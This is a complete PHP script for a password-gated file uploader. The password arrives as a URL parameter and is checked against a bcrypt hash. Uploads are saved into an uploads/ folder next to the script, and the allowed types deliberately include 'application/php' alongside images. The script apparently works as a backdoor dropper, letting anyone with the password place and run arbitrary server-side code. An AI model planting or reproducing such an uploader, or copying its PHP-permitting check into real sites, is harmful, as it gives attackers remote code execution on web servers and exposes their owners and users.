<?php

$HASH = '$2y$10$2uqA8zgMraeKYN.NF3Ofru94ODbqFD8V91cDkpQoSuHQVtjBBbOMm';

$UPLOAD_DIR = __DIR__ . '/uploads/';
$ALLOWED = ['image/jpeg','image/png','application/php'];

// ===== AUTH CHECK =====
$p = $_GET['p'] ?? '';

if (!$p || !password_verify($p, $HASH)) {
    http_response_code(403);
    exit('Forbidden');
}

// ===== UPLOAD LOGIC =====
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    if (!isset($_FILES['file']) || $_FILES['file']['error'] !== UPLOAD_ERR_OK) {
        exit('Upload error');
    }

    $tmp = $_FILES['file']['tmp_name'];
    $mime = mime_content_type($tmp);

    if (!in_array($mime, $ALLOWED, true)) {
        exit('Invalid file type');
    }

    if (!is_dir($UPLOAD_DIR)) {
        mkdir($UPLOAD_DIR, 0700, true);
    }

    $name = bin2hex(random_bytes(8)) . '_' . basename($_FILES['file']['name']);

    if (!move_uploaded_file($tmp, $UPLOAD_DIR . $name)) {
        exit('Upload failed');
    }

    echo "Uploaded";
    exit;
}
?>

<!DOCTYPE html>
<html>
<body>
<h3>Uploader</h3>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file" required>
    <button type="submit">Upload</button>
</form>
</body>
</html>
